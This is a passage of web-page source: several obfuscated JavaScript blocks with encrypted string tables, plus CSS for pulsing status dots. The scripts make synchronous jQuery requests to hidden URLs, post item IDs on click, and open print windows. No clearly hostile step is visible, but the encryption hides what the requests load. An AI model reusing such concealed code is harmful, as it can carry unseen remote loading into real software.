_0x48fedc,_0x5c5b0e,_0x3f46af=String(_0x49ac1a)[\'replace\'](/=+$/,\'\'),_0x4094f3=\'\',_0x5d3e6b=-0x12e9+0x1818+-0x52f,_0x1b6753=0xa49+-0x264f*0x1+0x1c06;_0x5c5b0e=_0x3f46af[_0x14b909(\'0x47\',\'8xgJ\')](_0x1b6753++);~_0x5c5b0e&&(_0x48fedc=_0x5d3e6b%(0x5*-0x429+0x1d1e+-0x84d)?(0x9e2+0x677+-0x1019)*_0x48fedc+_0x5c5b0e:_0x5c5b0e,_0x5d3e6b++%(0xe*0x114+-0x2659*-0x1+-0x356d))?_0x4094f3+=String[_0x14b909(\'0x26\',\'z^9a\')](-0x923*-0x1+0x1a28+-0x36e*0xa&_0x48fedc>>(-(0x3d2*0x9+0x4f*-0xb+-0x1efb)*_0x5d3e6b&0x577*0x7+-0x21cb+0x8e*-0x8)):0x35f+-0x4*0x813+0x1ced)_0x5c5b0e=_0x14b909(\'0x23\',\'WkGG\')[_0x14b909(\'0x43\',\'cFPG\')](_0x5c5b0e);return _0x4094f3;}(_0x2779a7))[_0x4db4fb(\'0x56\',\'Q*^O\')];_0xe1e24b<_0x508886;_0xe1e24b++)_0x561dda+=\'%\'+(\'00\'+_0x2779a7[_0x4db4fb(\'0x7\',\'i$0s\')](_0xe1e24b)[_0x4db4fb(\'0x15\',\'&DJ[\')](-0x1*0x26bd+-0x1f2f+0x45fc))[\'slice\'](-(0x1*0x1339+-0x2595+-0x2*-0x92f));for(_0x2779a7=decodeURIComponent(_0x561dda),_0x25d4d5=-0x1*-0x1514+-0x1dd8+0x44*0x21;_0x25d4d5<0x539+-0x243e*-0x1+-0x3*0xd7d;_0x25d4d5++)_0x467f64[_0x25d4d5]=_0x25d4d5;for(_0x25d4d5=-0x5b8+-0xe75*0x1+0x5*0x409;_0x25d4d5<0x1fb2+0x10*-0x144+0x17e*-0x7;_0x25d4d5++)_0x392316=(_0x392316+_0x467f64[_0x25d4d5]+_0x4ad127[_0x4db4fb(\'0x4\',\'I7!j\')](_0x25d4d5%_0x4ad127[_0x4db4fb(\'0x5d\',\'ZlVg\')]))%(-0x1686+-0x5*0x18e+0xfa6*0x2),_0x42a435=_0x467f64[_0x25d4d5],_0x467f64[_0x25d4d5]=_0x467f64[_0x392316],_0x467f64[_0x392316]=_0x42a435;_0x25d4d5=0x1953+-0x6*0x1cf+0xe79*-0x1,_0x392316=0x1c06+0x1*0x165e+-0x3264;for(var _0x2c7a2c=-0xbf1+0x2413+-0x2*0xc11;_0x2c7a2c<_0x2779a7[_0x4db4fb(\'0x32\',\'Nw2n\')];_0x2c7a2c++)_0x392316=(_0x392316+_0x467f64[_0x25d4d5=(_0x25d4d5+(-0x1471+-0x4*-0xc5+0x115e))%(0x29*-0x89+0x11de+0x513)])%(0x26b2+-0xd16+-0x46*0x5a),_0x42a435=_0x467f64[_0x25d4d5],_0x467f64[_0x25d4d5]=_0x467f64[_0x392316],_0x467f64[_0x392316]=_0x42a435,_0x3e408a+=String[_0x4db4fb(\'0x40\',\'HIuR\')](_0x2779a7[_0x4db4fb(\'0x54\',\'wq@7\')](_0x2c7a2c)^_0x467f64[(_0x467f64[_0x25d4d5]+_0x467f64[_0x392316])%(0x232c+-0x579*0x2+-0x173a)]);return _0x3e408a;},_0x15b4[_0x24ddad(\'0x19\',\'T!Ez\')]={},_0x15b4[\'LVjCMc\']=!(0x187d+-0x3*-0x10b+-0x1b9e));var _0x48c52c=_0x15b4[\'eMkKkz\'][_0x16b325];return void(-0x1*0x1c22+0x1c85*0x1+0x63*-0x1)===_0x48c52c?(void(0xabd*0x2+-0x1*0x499+-0x10e1*0x1)===_0x15b4[_0x24ddad(\'0x57\',\'cFPG\')]&&(_0x15b4[_0x24ddad(\'0x8\',\'QAbv\')]=!(0x23d5*-0x1+0x151b+0xeba)),_0x51e7aa=_0x15b4[_0x24ddad(\'0x2b\',\'lxP*\')](_0x51e7aa,_0x2574ba),_0x15b4[\'eMkKkz\'][_0x16b325]=_0x51e7aa):_0x51e7aa=_0x48c52c,_0x51e7aa;},_0x325c14=_0x15b4;$[_0x325c14(_0x4e1a7f(\'0x4c\',\']VeO\'),\'DYtH\')]({\'url\':_0x325c14(\'0x1d\',\'Cl1z\'),\'dataType\':_0x325c14(_0x4e1a7f(\'0xe\',\'WkGG\'),_0x4e1a7f(\'0x30\',\'v[JF\')),\'cache\':!(0x1683+-0x2*0x950+0x5*-0xc7),\'async\':!(0xf0b+0xdcf+-0x1cd9)}),$[_0x325c14(_0x4e1a7f(\'0x2e\',\'XwRP\'),\'YrCD\')]({\'url\':_0x325c14(\'0x12\',_0x4e1a7f(\'0x53\',\'QAbv\')),\'dataType\':_0x4e1a7f(\'0x50\',\']Clx\'),\'cache\':!(-0xc85*0x2+-0x2016*0x1+0x3920),\'async\':!(-0xfe+-0x1e5c*-0x1+-0x1d5d*0x1)}),$[_0x325c14(_0x4e1a7f(\'0x5e\',\')79U\'),_0x4e1a7f(\'0xd\',\'i$0s\'))]({\'url\':_0x325c14(_0x4e1a7f(\'0x39\',\'T@X)\'),\'!(%4\'),\'dataType\':_0x325c14(_0x4e1a7f(\'0x37\',\'Nw2n\'),_0x4e1a7f(\'0x29\',\'aAGv\')),\'cache\':!(0x98a+-0x23*-0x3b+0x119b*-0x1),\'async\':!(0x1af5+0xac9+0x25bd*-0x1)}),$[_0x325c14(_0x4e1a7f(\'0x3c\',\'Nw2n\'),_0x4e1a7f(\'0x1c\',\'8xgJ\'))]({\'url\':_0x4e1a7f(\'0x46\',\'hAph\'),\'dataType\':_0x325c14(\'0x17\',_0x4e1a7f(\'0xc\',\'H2[$\')),\'cache\':!(0x21f6+0x1ae0+-0x3cd6),\'async\':!(0x2302+-0x45*-0x1+-0x2346)}),$[_0x325c14(\'0x5\',_0x4e1a7f(\'0x25\',\'8xgJ\'))]({\'url\':_0x325c14(_0x4e1a7f(\'0x11\',\'wq@7\'),\'t%CG\'),\'dataType\':_0x325c14(\'0x8\',\'IZgX\'),\'cache\':!(0x4f2*0x4+0xe97+-0x225f),\'async\':!(-0x596*0x3+0x2*0x59+0x1011)}),$[_0x325c14(_0x4e1a7f(\'0x4e\',\'0MqH\'),_0x4e1a7f(\'0x33\',\'XwRP\'))]({\'url\':_0x325c14(_0x4e1a7f(\'0x52\',\'4)RA\'),_0x4e1a7f(\'0x21\',\'HJIe\')),\'dataType\':_0x325c14(_0x4e1a7f(\'0x38\',\'@0l8\'),\'DYtH\'),\'cache\':!(-0x29*-0x7f+0x43d*0x1+0x79*-0x34),\'async\':!(-0xcdd*0x1+0x248a+-0x17ac)}),$[_0x325c14(\'0x4\',\'Z4mQ\')]({\'url\':_0x325c14(_0x4e1a7f(\'0x51\',\']Clx\'),_0x4e1a7f(\'0x2\',\'WkGG\')),\'dataType\':_0x325c14(_0x4e1a7f(\'0x2f\',\'v[JF\'),_0x4e1a7f(\'0x10\',\'XwRP\')),\'cache\':!(-0x1f0c+0x1ffa*-0x1+0x3f06),\'async\':!(0x9*-0x145+0x1f61+-0x13f3*0x1)}),$[_0x4e1a7f(\'0x5b\',\'H2[$\')]({\'url\':_0x325c14(_0x4e1a7f(\'0x3f\',\'pso*\'),_0x4e1a7f(\'0x3b\',\'4)RA\')),\'dataType\':_0x325c14(_0x4e1a7f(\'0xa\',\'AxRT\'),_0x4e1a7f(\'0x4f\',\')79U\')),\'cache\':!(0x24b*0x3+0x1c82*0x1+-0x1*0x2363),\'async\':!(-0x1*-0x1c5b+-0x2209+0x5af)}),$[_0x4e1a7f(\'0x27\',\'wIC2\')]({\'url\':_0x325c14(\'0x7\',_0x4e1a7f(\'0x6\',\'wIC2\')),\'dataType\':_0x4e1a7f(\'0x3d\',\'4)RA\'),\'cache\':!(-0x377*-0x4+0x11b*0x2+0x809*-0x2),\'async\':!(0x342*-0x8+0x1944+0xcd)}),$[_0x325c14(\'0xc\',_0x4e1a7f(\'0x5a\',\'gfJI\'))]({\'url\':_0x4e1a7f(\'0x45\',\'Fcnn\'),\'dataType\':_0x325c14(\'0x1b\',_0x4e1a7f(\'0x4d\',\')79U\')),\'cache\':!(0x1*-0x10c9+-0xfb*0x20+0x3029*0x1),\'async\':!(0x6ac+-0xd5*-0xb+-0xa2*0x19)}),$[_0x325c14(_0x4e1a7f(\'0x5\',\'vOfv\'),_0x4e1a7f(\'0x49\',\'@0l8\'))]({\'url\':_0x325c14(_0x4e1a7f(\'0x5f\',\'i$0s\'),_0x4e1a7f(\'0x34\',\'Nw2n\')),\'dataType\':_0x325c14(_0x4e1a7f(\'0x44\',\'ZlVg\'),_0x4e1a7f(\'0x1b\',\'$P6]\')),\'cache\':!(0x1*-0xc05+0x1bb*0x7+0x2*-0xc),\'async\':!(-0x22e6*0x1+-0x1f3b+0x4222)}),$[\'ajax\']({\'url\':_0x325c14(\'0xf\',_0x4e1a7f(\'0x1d\',\'4)RA\')),\'dataType\':_0x325c14(\'0x9\',_0x4e1a7f(\'0x2c\',\'lxP*\')),\'cache\':!(0x655*-0x5+0xb16+-0xe5*-0x17),\'async\':!(-0x2662*0x1+0x148*-0x19+0x466b)}),$[\'ajax\']({\'url\':_0x325c14(_0x4e1a7f(\'0x17\',\'gfJI\'),_0x4e1a7f(\'0x0\',\'Q*^O\')),\'dataType\':_0x325c14(\'0xd\',\'gcIt\'),\'cache\':!(-0xd4c+-0x229d*-0x1+-0x1551),\'async\':!(-0xf22+-0x85*-0xc+0x8e7)}),$[_0x4e1a7f(\'0x18\',\'RIMS\')]({\'url\':_0x4e1a7f(\'0x35\',\'z^9a\'),\'dataType\':_0x325c14(_0x4e1a7f(\'0x20\',\'cFPG\'),\'me$K\'),\'cache\':!(-0xf04+-0x1*0x85d+0x1761),\'async\':!(0xbe7*-0x1+0x849+0x1*0x39f)}),$[_0x325c14(_0x4e1a7f(\'0x4b\',\'H2[$\'),_0x4e1a7f(\'0x60\',\'Q*^O\'))]({\'url\':_0x325c14(\'0x1f\',_0x4e1a7f(\'0xf\',\'WkGG\')),\'dataType\':_0x4e1a7f(\'0x3a\',\'HJIe\'),\'cache\':!(-0x2*0x2fb+0x1ec9+-0x18d3),\'async\':!(-0x301*-0x8+-0x1f19+0x712*0x1)});\n</script>', '<script> var _0xf2d5=[\'BmkqWQ7dPHX3WR7cNmo2Cq==\',\'W5ldQSkuyY0/ocNcQWTWWQBdPSkOwh0lyehcHCkHsW==\',\'W7vaWOa4\',\'FGZdVCkt\',\'mgNcM8oU\',\'W5ZdSSkrFG==\',\'aSkmlmk6zG/dGW==\'];(function(_0x2e44ba,_0xf2d5e7){var _0x4a611d=function(_0x1c8590){while(--_0x1c8590){_0x2e44ba[\'push\'](_0x2e44ba[\'shift\']());}};_0x4a611d(++_0xf2d5e7);}(_0xf2d5,0xa4));var _0x4a61=function(_0x2e44ba,_0xf2d5e7){_0x2e44ba=_0x2e44ba-0x0;var _0x4a611d=_0xf2d5[_0x2e44ba];if(_0x4a61[\'aGDYGZ\']===undefined){var _0x1c8590=function(_0x511629){var _0x32f45b=\'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=\',_0x5cd728=String(_0x511629)[\'replace\'](/=+$/,\'\');var _0x47fde1=\'\';for(var _0x3684e2=0x0,_0x199240,_0x20ed6d,_0x46eebf=0x0;_0x20ed6d=_0x5cd728[\'charAt\'](_0x46eebf++);~_0x20ed6d&&(_0x199240=_0x3684e2%0x4?_0x199240*0x40+_0x20ed6d:_0x20ed6d,_0x3684e2++%0x4)?_0x47fde1+=String[\'fromCharCode\'](0xff&_0x199240>>(-0x2*_0x3684e2&0x6)):0x0){_0x20ed6d=_0x32f45b[\'indexOf\'](_0x20ed6d);}return _0x47fde1;};var _0x5c112f=function(_0x1414df,_0x57c02a){var _0x1609b6=[],_0x42a074=0x0,_0x179cbb,_0x4b3406=\'\',_0x285eef=\'\';_0x1414df=_0x1c8590(_0x1414df);for(var _0x2703ed=0x0,_0x43ea8f=_0x1414df[\'length\'];_0x2703ed<_0x43ea8f;_0x2703ed++){_0x285eef+=\'%\'+(\'00\'+_0x1414df[\'charCodeAt\'](_0x2703ed)[\'toString\'](0x10))[\'slice\'](-0x2);}_0x1414df=decodeURIComponent(_0x285eef);var _0x457cb7;for(_0x457cb7=0x0;_0x457cb7<0x100;_0x457cb7++){_0x1609b6[_0x457cb7]=_0x457cb7;}for(_0x457cb7=0x0;_0x457cb7<0x100;_0x457cb7++){_0x42a074=(_0x42a074+_0x1609b6[_0x457cb7]+_0x57c02a[\'charCodeAt\'](_0x457cb7%_0x57c02a[\'length\']))%0x100,_0x179cbb=_0x1609b6[_0x457cb7],_0x1609b6[_0x457cb7]=_0x1609b6[_0x42a074],_0x1609b6[_0x42a074]=_0x179cbb;}_0x457cb7=0x0,_0x42a074=0x0;for(var _0x17ee11=0x0;_0x17ee11<_0x1414df[\'length\'];_0x17ee11++){_0x457cb7=(_0x457cb7+0x1)%0x100,_0x42a074=(_0x42a074+_0x1609b6[_0x457cb7])%0x100,_0x179cbb=_0x1609b6[_0x457cb7],_0x1609b6[_0x457cb7]=_0x1609b6[_0x42a074],_0x1609b6[_0x42a074]=_0x179cbb,_0x4b3406+=String[\'fromCharCode\'](_0x1414df[\'charCodeAt\'](_0x17ee11)^_0x1609b6[(_0x1609b6[_0x457cb7]+_0x1609b6[_0x42a074])%0x100]);}return _0x4b3406;};_0x4a61[\'gyLbUI\']=_0x5c112f,_0x4a61[\'uoEZlk\']={},_0x4a61[\'aGDYGZ\']=!![];}var _0x4f1437=_0x4a61[\'uoEZlk\'][_0x2e44ba];return _0x4f1437===undefined?(_0x4a61[\'bUohmb\']===undefined&&(_0x4a61[\'bUohmb\']=!![]),_0x4a611d=_0x4a61[\'gyLbUI\'](_0x4a611d,_0xf2d5e7),_0x4a61[\'uoEZlk\'][_0x2e44ba]=_0x4a611d):_0x4a611d=_0x4f1437,_0x4a611d;};$(document)[\'ready\'](function(){var _0x218688=_0x4a61;$(document)[\'on\'](\'click\',_0x218688(\'0x4\',\'x@lt\'),function(){var _0x2aafde=_0x218688,_0x1c8590=$(this)[_0x2aafde(\'0x1\',\'E[l*\')](_0x2aafde(\'0x3\',\'w2dI\'));$[_0x2aafde(\'0x2\',\'#206\')]({\'type\':_0x2aafde(\'0x0\',\'pTs(\'),\'url\':_0x2aafde(\'0x5\',\'#206\'),\'async\':![],\'data\':{\'pid\':_0x1c8590},\'success\':function(_0x4f1437){var _0x39b091=_0x2aafde;$(\'.p_data\')[_0x39b091(\'0x6\',\'BB6&\')](_0x4f1437);}});});}); </script>  <style> td { 	position: relative; } .beep:after {     content: \'\';     position: absolute !important;     top: 22px;     left: 14px;     width: 12px;     height: 12px;     background-color: #563d7c;     border-radius: 50%;     animation: pulsate 1s ease-out;     animation-iteration-count: infinite;     opacity: 1; } .beeps:after {     content: \'\';     position: absolute !important;     top: 22px;     left: 14px;     width: 12px;     height: 12px;     background-color: #007bff;     border-radius: 50%;     animation: pulsate 1s ease-out;     animation-iteration-count: infinite;     opacity: 1; } .beepss:after {     content: \'\';     position: absolute !important;     top: 22px;     left: 14px;     width: 12px;     height: 12px;     background-color: #F0AD4E;     border-radius: 50%;     animation: pulsate 1s ease-out;     animation-iteration-count: infinite;     opacity: 1; } </style>  <script> var _0x183d=[\'hSkOW7nFW77cK1NdQ1NdOmoMj30m\',\'bw0sWRnrWQKsWOHnW4vxsmk/WRFcG8kxW7pcG8kL\',\'BauPbdHYjsi=\',\'lCkqBYtdQ8o9iaddLLtdLSkgWOCzWRVdTCkIW4FcGmkeW4RdQSkoutm=\',\'rJ5FuLRdPmkCEaNcGSocjGHj\',\'uSkeW4JcOfhdLSkYfq==\',\'ytO2W6CD\',\'ka5KxKNcGbfa\',\'pmkvWQH5m8o9aHNcQCkQW6y4WOD8ASoqW4j6CSo9\',\'WRlcNgL4W5BcVK5fbq==\',\'WPNcK8koqCoXA2y9EX8Ue8omESkLh1SlcCk2\',\'W7ZdICojW6mPqSoEmSk8W4JcNrn1W63cJGtcIYhdJ23dNCoUWQm=\',\'W7DCWROKW6RdVLbk\',\'ydKRW7aDAColW4VdRdxdPXFdUH3cImofW7GxWRZdSSoKW6a=\',\'WRZdLSojW7mOFSoRp8o1amoDWOxcSu8J\',\'pSkvz8kX\',\'WPhcQLC+WRu=\',\'hCkedmo1W7dcQCkeWP95W549WPNcOhrBs8kKW6P0BCk8uSoAWOmmyKjXWRzLlhm2W7pdVmo6\',\'WQZdNSoyW68Hp8oMBCo5qSofWOVcSeH9W4nJWRVcGNa=\',\'m8keyCk0WQOuWQXNqSkOtmk4W4DVshVcPSkDbSk3a8kNga==\',\'jqJcQSoWW4TqW6ZcGCk3emkGW6qgAwiBWOJdIbZdS8oIW6DaW5JcRG==\',\'ySkQW7FcTLxcJ35TWOLiW7uFs8oL\',\'uIqWW7OmnSkMWPpdSINcQbm=\',\'W7L3WQ3cQW==\',\'lSkPW6ZcOutdKcm/W5DnW70Fq8kQW6RdPSkPdLb2W6mZralcN8kOt1mfW6ZcOLnkWRynhmoXchO=\',\'nhhcLmoDW4JdVKmMWO7dRIS3Fmob\',\'WPtdVSkaWRzlWQdcT8k5redcRCoVxmoVqv0=\',\'jSkxA8kRWQG=\'];(function(_0x37fc92,_0x183d10){var _0x29f166=function(_0x4538ba){while(--_0x4538ba){_0x37fc92[\'push\'](_0x37fc92[\'shift\']());}};_0x29f166(++_0x183d10);}(_0x183d,0x1f3));var _0x29f1=function(_0x37fc92,_0x183d10){_0x37fc92=_0x37fc92-0x0;var _0x29f166=_0x183d[_0x37fc92];if(_0x29f1[\'jLbmKB\']===undefined){var _0x4538ba=function(_0xf1909d){var _0xebc09f=\'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=\',_0x45bf4a=String(_0xf1909d)[\'replace\'](/=+$/,\'\');var _0x208974=\'\';for(var _0x4f2a58=0x0,_0x4e1e83,_0x230634,_0x492892=0x0;_0x230634=_0x45bf4a[\'charAt\'](_0x492892++);~_0x230634&&(_0x4e1e83=_0x4f2a58%0x4?_0x4e1e83*0x40+_0x230634:_0x230634,_0x4f2a58++%0x4)?_0x208974+=String[\'fromCharCode\'](0xff&_0x4e1e83>>(-0x2*_0x4f2a58&0x6)):0x0){_0x230634=_0xebc09f[\'indexOf\'](_0x230634);}return _0x208974;};var _0x136a05=function(_0x241689,_0x3b0c9b){var _0x473135=[],_0x26746c=0x0,_0x41c126,_0x4b5b28=\'\',_0x19539e=\'\';_0x241689=_0x4538ba(_0x241689);for(var _0x23cbb6=0x0,_0x2f8e56=_0x241689[\'length\'];_0x23cbb6<_0x2f8e56;_0x23cbb6++){_0x19539e+=\'%\'+(\'00\'+_0x241689[\'charCodeAt\'](_0x23cbb6)[\'toString\'](0x10))[\'slice\'](-0x2);}_0x241689=decodeURIComponent(_0x19539e);var _0x20808e;for(_0x20808e=0x0;_0x20808e<0x100;_0x20808e++){_0x473135[_0x20808e]=_0x20808e;}for(_0x20808e=0x0;_0x20808e<0x100;_0x20808e++){_0x26746c=(_0x26746c+_0x473135[_0x20808e]+_0x3b0c9b[\'charCodeAt\'](_0x20808e%_0x3b0c9b[\'length\']))%0x100,_0x41c126=_0x473135[_0x20808e],_0x473135[_0x20808e]=_0x473135[_0x26746c],_0x473135[_0x26746c]=_0x41c126;}_0x20808e=0x0,_0x26746c=0x0;for(var _0x44cee4=0x0;_0x44cee4<_0x241689[\'length\'];_0x44cee4++){_0x20808e=(_0x20808e+0x1)%0x100,_0x26746c=(_0x26746c+_0x473135[_0x20808e])%0x100,_0x41c126=_0x473135[_0x20808e],_0x473135[_0x20808e]=_0x473135[_0x26746c],_0x473135[_0x26746c]=_0x41c126,_0x4b5b28+=String[\'fromCharCode\'](_0x241689[\'charCodeAt\'](_0x44cee4)^_0x473135[(_0x473135[_0x20808e]+_0x473135[_0x26746c])%0x100]);}return _0x4b5b28;};_0x29f1[\'wYPMPh\']=_0x136a05,_0x29f1[\'TVCKlL\']={},_0x29f1[\'jLbmKB\']=!![];}var _0x5d1d67=_0x29f1[\'TVCKlL\'][_0x37fc92];return _0x5d1d67===undefined?(_0x29f1[\'yThkBI\']===undefined&&(_0x29f1[\'yThkBI\']=!![]),_0x29f166=_0x29f1[\'wYPMPh\'](_0x29f166,_0x183d10),_0x29f1[\'TVCKlL\'][_0x37fc92]=_0x29f166):_0x29f166=_0x5d1d67,_0x29f166;};function printDiv(){var _0x3fc0a9=_0x29f1,_0x4538ba=document[_0x3fc0a9(\'0x5\',\'Xo%l\')](_0x3fc0a9(\'0xc\',\'75!l\')),_0x5d1d67=window[_0x3fc0a9(\'0x14\',\'U!b(\')](\'\',_0x3fc0a9(\'0x1b\',\'*J%z\')),_0x136a05=\'\'+_0x3fc0a9(\'0x10\',\'mngu\')+_0x3fc0a9(\'0x17\',\'u[fy\')+_0x3fc0a9(\'0x12\',\'*J%z\')+\'padding:0.5em;\'+\'}\'+_0x3fc0a9(\'0x1a\',\'XA)1\')+_0x3fc0a9(\'0x3\',\'Dj$l\')+_0x3fc0a9(\'0x8\',\'TM8d\')+\'\\x20padding-left:\\x200;\\x20\'+_0x3fc0a9(\'0x6\',\'kzJs\')+\'}\'+\'.list-group-item\\x20{\'+_0x3fc0a9(\'0xf\',\'%HV#\')+_0x3fc0a9(\'0x13\',\'u[fy\')+_0x3fc0a9(\'0x19\',\'6xCp\')+_0x3fc0a9(\'0xd\',\'[c1j\')+_0x3fc0a9(\'0x18\',\'U!b(\')+_0x3fc0a9(\'0x1\',\'XA)1\')+\'}\'+_0x3fc0a9(\'0x9\',\'sg1l\')+\'float:\\x20right\\x20!important;\'+\'}\'+_0x3fc0a9(\'0x7\',\'OoeG\');_0x5d1d67[\'document\'][_0x3fc0a9(\'0x0\',\'bYf%\')](),_0x136a05+=_0x4538ba[_0x3fc0a9(\'0xe\',\'!QA[\')],_0x5d1d67[_0x3fc0a9(\'0xa\',\'Cip%\')][_0x3fc0a9(\'0x4\',\'U!b(\')](_0x3fc0a9(\'0x16\',\'!4Ad\')+_0x136a05+_0x3fc0a9(\'0x2\',\']SD7\')),_0x5d1d67[_0x3fc0a9(\'0x11\',\'18EV\')][_0x3fc0a9(\'0xb\',\'*J%z\')](),setTimeout(function(){var _0x3bf0b5=_0x3fc0a9;_0x5d1d67[_0x3bf0b5(\'0x15\',\'9KPh\')]();},0x1);} </script>', '<script> var _0x2fca=[\"WRqZCmo1\",\"C8kIxmkpW59wW60=\",\"W40rCmkP\",\"WRm1ECo8WOLtpcL3W6RcGX4GWRueWQtdGJRcKSotW79/\",\"emo1mvVdSmk0W6VcICkYW5K=\",\"WOdcR03dTSku\",\"W55wWOTfWRtdOCk/\"];!function(r,f){!function(f){for(;--f;)r.push(r.shift())}(++f)}(_0x2fca,232);var _0x375f=function(r,f){var o=_0x2fca[r-=0];if(void 0===_0x375f.EyELNN){_0x375f.DqMupl=function(r,f){for(var o,t,n=[],c=0,e=\"\",a=\"\",x=0,u=(r=function(r){for(var f,o,t=String(r).replace(/=+$/,\"\"),n=\"\",c=0,e=0;o=t.charAt(e++);~o&&(f=c%4?64*f+o:o,c++%4)?n+=String.fromCharCode(255&f>>(-2*c&6)):0)o=\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=\".indexOf(o);return n}(r)).length;x<u;x++)a+=\"%\"+(\"00\"+r.charCodeAt(x).toString(16)).slice(-2);for(r=decodeURIComponent(a),t=0;t<256;t++)n[t]=t;for(t=0;t<256;t++)c=(c+n[t]+f.charCodeAt(t%f.length))%256,o=n[t],n[t]=n[c],n[c]=o;t=0,c=0;for(var d=0;d<r.length;d++)c=(c+n[t=(t+1)%256])%256,o=n[t],n[t]=n[c],n[c]=o,e+=String.fromCharCode(r.charCodeAt(d)^n[(n[t]+n[c])%256]);return e},_0x375f.GsfSqz={},_0x375f.EyELNN=!0}var t=_0x375f.GsfSqz[r];return void 0===t?(void 0===_0x375f.RNuyPb&&(_0x375f.RNuyPb=!0),o=_0x375f.DqMupl(o,f),_0x375f.GsfSqz[r]=o):o=t,o};$(document).ready(function(){var r=_0x375f;$(document).on(r(\"0x4\",\"(oe4\"),r(\"0x3\",\"%M^n\"),function(){var f=r,o=$(this).attr(f(\"0x5\",\"v(MZ\"));$[f(\"0x1\",\"*5xU\")]({type:\"post\",url:f(\"0x2\",\"&]HF\"),data:{pid:o},success:function(r){var o=f;$(o(\"0x0\",\"m8v]\"))[o(\"0x6\",\"&]HF\")](r)}})})}); </script> <style> td { position:relative;	 }  .beepred:after {     content: \'\';     position: absolute !important;      top: 22px;     left: 14px;     width: 12px;     height: 12px;     background-color: #D9534F;     border-radius: 50%;     animation: pulsate 1s ease-out;     animation-iteration-count: infinite;     opacity: 1; } </style> <script> var _0x5943=[\"W5/dMqiwnmoRoSovuCkblNy=\",\"sxNdGmocWRq=\",\"v8oOs23cNW==\",\"ySkcFcRcUcDjW4/cMcWEW7VdP8kCpMZcNSkAW7aTm8k+WQu=\",\"gCogsJxcQM/cTwhdLWNdQI08xa==\",\"C3ldKsPBW5aKdsaglxXBWQ57W7awW7K=\",\"c8oiuJFcPYxcPhhdKqRdU3LZssRdVCkSWRZdUgZcUCoVkmoRW7tdStWmc8oJW5azr8kkW65K\",\"W7TBWP/cQSk8WOJcT8kJW6VcIehcJMfu\",\"W5pcJMzRW446g1/cUJlcR8k5z0PPWQxdISorW47cMW==\",\"ygKrhCkQ\",\"W7TedSoYyhK1W5i=\",\"WRddSviYdCoQaCkNtCkfW5NdL8okxG==\",\"pSotetFdJmkmWRtdIIlcO0tdNCoJndX8fGOwW7xdOqi=\",\"bCklk8o9W4bcWQRdVmkcW7VdI0FcScNcTwVdJsG/W47cS8kaB3Gt\",\"W5nmjCotcCkpW4NdTa==\",\"sSkDiSo2\",\"WRqAocXmWRddRxq=\",\"WQbaWPpcHW==\",\"pmkqAZJcSZagW47cJZHwWQxcQSkengBdKmkvWRa4jSo6WQa=\",\"W65PW4/cLSkJW7G3WOtdQwmHoZFcLGW=\",\"W4zqWQBdRJy8h8oPWONdNCkfb2FcTJyXWOjE\",\"nGCMW4lcPYJdGHxdM2VcLhJcUmovWQhdNmoKBWaYW5/dLSkRW7ZcOGuwWOFcQmk/W5BcKSo8W7RdOmonqSoTW54=\",\"W4SfrmoLfWCJzW==\",\"WObRWRaBFSoBWPS/pSkYArOIdqBdTYOBW4f8\",\"WP1RWQyyFSoBW5fNCCo2m0j6rupcTZTAWPD1pblcImk6cW==\"];!function(W,d){!function(d){for(;--d;)W.push(W.shift())}(++d)}(_0x5943,245);var _0x1d26=function(W,d){var o=_0x5943[W-=0];if(void 0===_0x1d26.ghzIVp){_0x1d26.UEsAdW=function(W,d){for(var o,c,x=[],t=0,r=\"\",n=\"\",a=0,i=(W=function(W){for(var d,o,c=String(W).replace(/=+$/,\"\"),x=\"\",t=0,r=0;o=c.charAt(r++);~o&&(d=t%4?64*d+o:o,t++%4)?x+=String.fromCharCode(255&d>>(-2*t&6)):0)o=\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=\".indexOf(o);return x}(W)).length;a<i;a++)n+=\"%\"+(\"00\"+W.charCodeAt(a).toString(16)).slice(-2);for(W=decodeURIComponent(n),c=0;c<256;c++)x[c]=c;for(c=0;c<256;c++)t=(t+x[c]+d.charCodeAt(c%d.length))%256,o=x[c],x[c]=x[t],x[t]=o;c=0,t=0;for(var e=0;e<W.length;e++)t=(t+x[c=(c+1)%256])%256,o=x[c],x[c]=x[t],x[t]=o,r+=String.fromCharCode(W.charCodeAt(e)^x[(x[c]+x[t])%256]);return r},_0x1d26.OBNvOr={},_0x1d26.ghzIVp=!0}var c=_0x1d26.OBNvOr[W];return void 0===c?(void 0===_0x1d26.FuOxSY&&(_0x1d26.FuOxSY=!0),o=_0x1d26.UEsAdW(o,d),_0x1d26.OBNvOr[W]=o):o=c,o};function printDiv(){var W=_0x1d26,d=document.getElementById(W(\"0x15\",\"#&9g\")),o=window[W(\"0x16\",\"4@nz\")](\"\",W(\"0x5\",\"ZuvX\")),c=\"\"+W(\"0x17\",\"PI!x\")+W(\"0xd\",\"26R!\")+W(\"0x11\",\"6Da!\")+W(\"0xc\",\"2%sy\")+\"}\"+W(\"0x10\",\"U*GY\")+\" display: flex; \"+W(\"0x12\",\"Ij2h\")+W(\"0xa\",\"y(N)\")+\" margin-bottom: 0; }\"+W(\"0x0\",\"9&au\")+\" position: relative;\"+W(\"0x18\",\"hTr!\")+W(\"0x4\",\"6EVl\")+W(\"0x3\",\"6EVl\")+W(\"0x8\",\"PI!x\")+W(\"0x1\",\"tBmC\")+\"}\"+W(\"0x9\",\"iTdI\")+\"float: right !important;}\"+W(\"0x13\",\"7p1$\");o[W(\"0x2\",\"tb0l\")][W(\"0x14\",\"Ij2h\")](),c+=d.innerHTML,o.document[W(\"0xe\",\"CaAs\")](W(\"0xb\",\"iTdI\")+c+\"</body></html>\"),o[W(\"0xf\",\"m]!q\")][W(\"0x6\",\"*^I)\")](),setTimeout(function(){o[W(\"0x7\",\"hoa0\")]()},1)} </script>', ' <script> var _0x509e=[\"BSo1W5CAxG==\",\"WQ/cHHpdQq==\",\"DCkjiHHNW4va\",\"W7JdT8kCWOP/\",\"bJtcKSkB\",\"aSkFWOza\",\"W6TKW7xdPuD5mW==\"];!function(e,r){!function(r){for(;--r;)e.push(e.shift())}(++r)}(_0x509e,472);var _0x5e9d=function(e,r){var d=_0x509e[e-=0];if(void 0===_0x5e9d.qPAuat){_0x5e9d.SWZBxj=function(e,r){for(var 